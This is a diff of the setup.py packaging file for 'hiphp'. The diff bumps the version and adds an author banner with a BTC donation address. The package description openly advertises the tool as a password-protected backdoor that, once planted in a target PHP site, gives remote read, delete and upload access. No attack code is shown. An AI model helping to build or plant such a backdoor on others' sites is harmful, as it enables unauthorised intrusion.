@@ -1,13 +1,21 @@
 #!/usr/bin/env python
 # coding:utf-8
-# code by : yasserbdj96
-# email : yasser.bdj96@gmail.com
+#   |                                                          |
+# --+----------------------------------------------------------+--
+#   |   Code by : yasserbdj96                                  |
+#   |   Email   : yasser.bdj96@gmail.com                       |
+#   |   Github  : https://github.com/yasserbdj96               |
+#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
+# --+----------------------------------------------------------+--  
+#   |        all posts #yasserbdj96 ,all views my own.         |
+# --+----------------------------------------------------------+--
+#   |                                                          |
 
 #START{
 from setuptools import setup,find_packages
 setup(
     name="hiphp",
-    version="0.2.18",
+    version="0.2.19",
     author="yasserbdj96",
     author_email="yasser.bdj96@gmail.com",
     description='''hiphp is BackDoor to control php-based sites hiphp can be controlled by sending commands, files, and tokens to the site using the http/https protocol. After copying the code and placing it in any php file on the target website, you will have permissions to enter it, read all files, delete and even upload new files to it. Also, this back door is password protected.''',
